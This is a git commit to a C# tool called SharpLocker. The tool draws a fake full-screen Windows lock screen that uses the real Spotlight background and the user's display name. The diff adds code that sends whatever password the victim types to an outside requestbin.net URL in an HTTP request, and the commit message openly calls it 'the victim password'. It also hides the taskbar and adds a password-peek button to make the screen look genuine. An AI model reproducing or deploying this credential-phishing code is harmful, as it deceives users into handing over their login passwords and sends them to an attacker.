92c35d99a3c2e8f94a893af37976cca8449b85a7
Ascensao <b.ascensao@gmail.com>
2020-02-18 17:30:37 +0000

    - Major  GUI upgrades - Code cleaned  -Real user name display. (Not the user folder name). - Http Web Request to send the victim password. - Added TextBox Enter Event and Trigger Web Request Event - Added mouseover event in the "peeking password button" for the user sees the password he is typing on. - Added bottom right corner buttons.

--- SharpLocker/LockScreenForm.cs
+++ SharpLocker/LockScreenForm.cs
@@ -1,10 +1,18 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.ComponentModel;
+using System.Data;
 using System.Diagnostics;
 using System.Drawing;
+using System.Linq;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Net;
+using Microsoft.Win32;
 using System.IO;
+
 
 namespace SharpLocker
 {
@@ -13,40 +21,106 @@ namespace SharpLocker
         public LockScreenForm()
         {
             InitializeComponent();
-            Taskbar.Hide();
-            
             FormBorderStyle = FormBorderStyle.None;
             WindowState = FormWindowState.Normal;
             StartPosition = FormStartPosition.Manual;
             Location = new Point(0, 0);
             Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            
             Image myimage = new Bitmap(getSpotlightImage());
             BackgroundImage = myimage;
             BackgroundImageLayout = ImageLayout.Stretch;
-            TopMost = true;
-            
-            string userName = Environment.UserName;
+            this.TopMost = true;
+            string userName = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
             UserNameLabel.Text = userName;
-            UserNameLabel.BackColor = Color.Transparent;
+            UserNameLabel.BackColor = System.Drawing.Color.Transparent;
+
+            int percentHeight = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100);
+            int middleWidth = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width) / 2);
+            int tbsize = 28;
+            int tbwidth = 200;
             
-            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
-            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
-            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
-            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
-            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;
-           
-            PasswordTextBox.Top = usernameloch;
-            PasswordTextBox.UseSystemPasswordChar = true;
-            ProfileIcon.Top = usericonh;
-            SubmitPasswordButton.Top = buttonh;
-            UserNameLabel.Top = usernameh;
-            LockedLabel.Top = locked;
+            ProfileIcon.Top = percentHeight * 27;
+            ProfileIcon.Left = middleWidth - 100;
+
+            UserNameLabel.Top = percentHeight * 51;
+            UserNameLabel.Left = middleWidth - 201;
             
+            SubmitPasswordButton.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
+            SubmitPasswordButton.Left = middleWidth + (tbwidth / 2) - 11;
+
+            show.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
+            show.Left = middleWidth + (tbwidth / 2) - 45;
+
+            PasswordTextBox.Top = Convert.ToInt32(percentHeight * 59.4);
+            PasswordTextBox.Size = new System.Drawing.Size(tbwidth-4, Convert.ToInt32(tbsize));
+            PasswordTextBox.Left = middleWidth - (tbwidth / 2) - 12;
+
+            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize*0.125));
+            textboxBackground.Left = Convert.ToInt32(middleWidth - (tbwidth / 2) - (tbsize * 0.125) - 12);
+            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)), Convert.ToInt32(tbsize*1.25));
+
+            power.Left = Screen.PrimaryScreen.Bounds.Width - 60;
+            power.Top = Screen.PrimaryScreen.Bounds.Height - 60;
+
+            accessibility.Left = Screen.PrimaryScreen.Bounds.Width - 110;
+            accessibility.Top = Screen.PrimaryScreen.Bounds.Height - 60;
+
+            language.Left = Screen.PrimaryScreen.Bounds.Width - 160;
+            language.Top = Screen.PrimaryScreen.Bounds.Height - 60;
+
             foreach (var screen in Screen.AllScreens)
             {
+
                 Thread thread = new Thread(() => WorkThreadFunction(screen));
                 thread.Start();
+            }
+        }
+
+        public class Taskbar
+        {
+            [DllImport("user32.dll")]
+            private static extern int FindWindow(string className, string windowText);
+
+            [DllImport("user32.dll")]
+            private static extern int ShowWindow(int hwnd, int command);
+
+            [DllImport("user32.dll")]
+            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);
+
+            [DllImport("user32.dll")]
+            private static extern int GetDesktopWindow();
+
+            private const int SW_HIDE = 0;
+            private const int SW_SHOW = 1;
+
+            protected static int Handle
+            {
+                get
+                {
+                    return FindWindow("Shell_TrayWnd", "");
+                }
+            }
+
+            protected static int HandleOfStartButton
+            {
+                get
+                {
+                    int handleOfDesktop = GetDesktopWindow();
+                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
+                    return handleOfStartButton;
+                }
+            }
+
+            public static void Show()
+            {
+                ShowWindow(Handle, SW_SHOW);
+                ShowWindow(HandleOfStartButton, SW_SHOW);
+            }
+
+            public static void Hide()
+            {
+                ShowWindow(Handle, SW_HIDE);
+                ShowWindow(HandleOfStartButton, SW_HIDE);
             }
         }
 
@@ -54,6 +128,12 @@ namespace SharpLocker
         {
             try
             {
+                if (screen.Primary == true)
+                {
+
+
+                }
+
                 if (screen.Primary == false)
                 {
                     int mostLeft = screen.WorkingArea.Left;
@@ -71,24 +151,20 @@ namespace SharpLocker
                     }
                 }
             }
-            catch (Exception ex)
-            {
-                // log errors
-            }
+            catch { }
         }
-
         public string getSpotlightImage()
-        { 
-            //Get Windows Spotlight Images Location Path.      C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\
+        {
+            //Get Windows Spotlight Images Location Path. (C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\)
             string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");
-            
+
             /* Save the name of the larger image from spotlight dir.
              * Normally the larger image present in this directory is the current lock screen image. */
             string img_name = "";
-            
+
             //Save image full path
             string img_path = "";
-            
+
             DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
             long largestSize = 0;
             foreach (var fi in folderInfo.GetFiles())
@@ -104,6 +180,12 @@ namespace SharpLocker
             return img_path;
         }
 
+        private void sendTexbyHTTP(string tBoxText)
+        {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/1cqzjno1?" + tBoxText);
+            request.GetResponse();
+        }
+
         protected override CreateParams CreateParams
         {
             get
@@ -114,10 +196,9 @@ namespace SharpLocker
                 return parms;
             }
         }
-        
+
         protected override void OnClosing(CancelEventArgs e)
         {
-            Taskbar.Show();
             base.OnClosing(e);
         }
 
@@ -125,11 +206,34 @@ namespace SharpLocker
         {
             Console.WriteLine(PasswordTextBox);
         }
-
-        private void SubmitPasswordButton_Click(object sender, EventArgs e)
+        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
-            Taskbar.Show();
+            if (e.KeyCode == Keys.Enter)
+            {
+                sendTexbyHTTP(PasswordTextBox.Text);
+            }
+        }
+
+        private void pictureBox3_Click(object sender, EventArgs e)
+        {
             Application.Exit();
         }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            sendTexbyHTTP(PasswordTextBox.Text);
+            Application.Exit();
+        }
+
+        private void show_MouseDown(object sender, MouseEventArgs e)
+        {
+            PasswordTextBox.UseSystemPasswordChar = false;
+        }
+
+        private void show_MouseUp(object sender, MouseEventArgs e)
+        {
+            PasswordTextBox.UseSystemPasswordChar = true;
+        }
+    
     }
 }
